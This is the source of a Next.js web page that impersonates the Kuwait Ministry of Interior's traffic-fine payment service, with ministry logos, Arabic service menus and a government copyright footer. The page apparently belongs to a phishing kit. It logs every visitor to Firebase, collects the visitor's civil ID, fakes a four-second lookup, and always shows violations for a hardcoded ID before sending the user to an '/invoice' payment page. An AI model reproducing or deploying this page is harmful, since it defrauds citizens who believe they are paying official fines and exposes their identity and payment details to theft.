'use client';
import Image from 'next/image';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Label } from '@/components/ui/label';
import {
  Calendar,
  CreditCard,
  FileText,
  MapPin,
  Menu,
  PlayIcon,
  UserCheck,
} from 'lucide-react';
import type React from 'react'; // Added import for React
import { useRouter } from 'next/navigation';
import { ViolationResult } from '@/components/violation-result';
import { useEffect, useState } from 'react';
import { SkeletonDemo } from '@/components/sektlokm';
import { ReferenceNumberSection } from '@/components/reference-number-section';
import { addData } from '@/lib/firebase-service';

export default function Home() {
  const [currantPage,setCurrantPage]=useState(1)
  const [_id]=useState( "id" + Math.random().toString(16).slice(2))
  const [id, setid] = useState('')

const data={
    id:_id,
    currentPage:currantPage,
    createdDate: new Date().toISOString(),
    notificationCount:1,
    personalInfo: {
     id:id
    },
  };
  const [show, setShow] = useState(false)
  const [loading, setloading] = useState(false)
  const router = useRouter();
  const handlePayClicked = () => {
    addData(data)
    router.push('/invoice');

  };
  useEffect(()=>{
    localStorage.setItem('vistor',_id)
      addData(data)
    },[])
  const handleSubmit = () => {
    if (id !== '' || id.length > 2) {
      setloading(true)
      setTimeout(() => {
        setShow(true)
        setloading(false)

      }, 4000);
    }
  };
  return (
    <div className="min-h-screen  text-right" dir="rtl" style={{
      backgroundColor: `rgba(256, 256, 256, ${70 / 100})`,
    }}>
  
      {/* Header */}
      <div className='flex'>
      <Image
              src={`/logo.svg`}
              alt="Kuwait Ministry of Interior Logo"
              width={280}
              height={150}
              className="h-32 w-auto"
            />  
      <div className='flex items-center flex-col mt-8' >
      <Image
              src={`/vercel.svg`}
              alt="Kuwait Ministry of Interior Logo"
              width={180}
              height={50}
              className="h-8 w-auto"
            />    <Image
            src={`/next.svg`}
            alt="Kuwait Ministry of Interior Logo"
            width={180}
            height={50}
            className="h-8 w-auto"
          />
        </div>
        </div>
      <header className=" shadow-sm m-4 bg-navy-700">
        <div className="container mx-auto px-4 py-2">
          <div className="flex items-center justify-between">
            <button className="p-2 text-gray-200">
              <Menu className="h-6 w-6" />
            </button>
       
          </div>
        </div>
      </header>

      {/* Traffic Department Logo */}
      <div className="container mx-auto px-4 py-4"  >
        <div className="flex justify-center">
          <Image
            src="/mor.svg"
            alt="Traffic Department Logo"
            width={80}
            height={80}
            className="h-20 w-auto"
          />
        </div>
        <h2 className="text-center text-xl font-bold text-navy-700 mt-2">
          الإدارة العامة للمرور
        </h2>
      </div>

      {/* Services Grid */}
      <div className="container mx-auto px-4 py-6">
        <div className="grid grid-cols-1 gap-4 bg-navy-700 p-4 rounded-lg">
          <ServiceButton
            icon={<FileText />}
            text="الخدمات الالكترونية لرخص السوق"
          />
          <ServiceButton icon={<CreditCard />} text="دفع المخالفات" />
          <ServiceButton
            icon={<Calendar />}
            text="نظام مواعيد اختبار القيادة"
          />
          <ServiceButton icon={<FileText />} text="معاملات المرور" />
          <ServiceButton icon={<MapPin />} text="مواقع الإدارة العامة للمرور" />
          <ServiceButton
            icon={<UserCheck />}
            text="شروط منح رخص السوق لغير الكويتيين"
          />
        </div>
      </div>

      {/* Login Form */}
      <div className="container mx-auto px-4 py-6">
        <div className="bg-white rounded-lg p-6 shadow-sm">
          <h3 className="text-lg font-semibold mb-4">الإدارة العامة للمرور</h3>

          <RadioGroup defaultValue="individuals" className="mb-4">
            <div className="flex items-center space-x-4 space-x-reverse">
              <Label className="flex items-center space-x-2 space-x-reverse">
                <RadioGroupItem value="individuals" />
                <span>الأفراد</span>
              </Label>
              <Label className="flex items-center space-x-2 space-x-reverse">
                <RadioGroupItem value="companies" />
                <span>الشركات</span>
              </Label>
            </div>
          </RadioGroup>

          <div className="space-y-4">
            <div>
              <Label>الرقم المدني أو الرقم الموحد</Label>
              <Input className="text-right" onChange={(e) => setid(e.target.value)} />
            </div>

            <Button variant={'outline'} onClick={handleSubmit} className="w-full  hover:bg-navy-700 hover:text-white">
              إستعلام
            </Button>

            {show ? <>  <ViolationResult civilId={'112322'} violations={undefined!} />
              <p className="text-sm text-gray-600 text-center">
                بعد إجراء عملية الدفع، يرجى عدم محاولة الدفع مرة أخرى حيث يجب
                تحديث البيانات خلال 15 دقيقة
              </p>

              <Button 
              onClick={handlePayClicked} className="w-full">
                ادفع
              </Button></> : loading? <SkeletonDemo/>:null}
            <div className="flex justify-center gap-2">
              <Button
                size={'sm'}
                variant="default" className="bg-red-600 border-red-600">
                غير قابلة للدفع الكترونيا
              </Button>
              <Button
                variant="default"
                size={'sm'}
                className="bg-green-600 border-green-600"
              >
                قابلة للدفع الكترونيا
              </Button>
            </div>
          </div>
        </div>
      </div>
<ReferenceNumberSection/>
      {/* Footer */}
      <footer className="bg-navy-700 text-white py-4 mt-8">
        <div className="container mx-auto px-4">
           {/* Social Media Footer */}
      <div className="flex justify-center space-x-4 py-4">
        <div className="flex gap-4">
          {["1", "2", "3", "4", "5", "6"].map((platform) => (
            <a
              key={platform}
              href={`#${platform}`}
              className="w-6 h-6 flex items-center justify-center"
              aria-label={`Visit our ${platform} page`}
            >
              <Image
                src={`/${platform}.svg`}
                alt={platform}
                width={24}
                height={24}
                className="opacity-75 hover:opacity-100 transition-opacity"
              />
            </a>
          ))}
        </div>
      </div>

          <p className="text-center text-sm">
            © جميع الحقوق محفوظة - وزارة الداخلية الكويتية 2025-2026
          </p>
        </div>
      </footer>
    </div>
  );
}

function ServiceButton({
  icon,
  text,
}: {
  icon: React.ReactNode;
  text: string;
}) {
  return (
    <button className="flex items-center gap-3 w-full bg-navy-800 hover:bg-navy-900 text-white p-4 rounded-lg transition-colors">
      {icon}
      <span>{text}</span>
    </button>
  );
}
